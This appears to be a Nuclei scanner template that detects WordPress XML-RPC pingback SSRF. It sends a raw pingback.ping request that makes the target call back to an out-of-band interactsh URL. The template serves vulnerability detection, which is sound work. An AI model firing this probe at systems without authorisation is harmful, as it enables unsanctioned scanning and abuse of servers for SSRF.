id: wp-xmlrpc-pingback-detection
info:
  author: pdteam
  name: Wordpress XMLRPC Pingback detection
  reference:
  - https://github.com/dorkerdevil/rpckiller
  - https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32
  severity: info
  tags: wordpress,ssrf,oast,xmlrpc
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - "POST /xmlrpc.php HTTP/1.1\nHost: {{Hostname}}\n\n<methodCall>\n  <methodName>pingback.ping</methodName>\n\
    \  <params>\n    <param>\n      <value>\n        <string>http://{{interactsh-url}}</string>\n\
    \      </value>\n    </param>\n    <param>\n      <value>\n        <string>{{BaseURL}}/?p=1</string>\n\
    \      </value>\n    </param>\n  </params>\n</methodCall>\n"
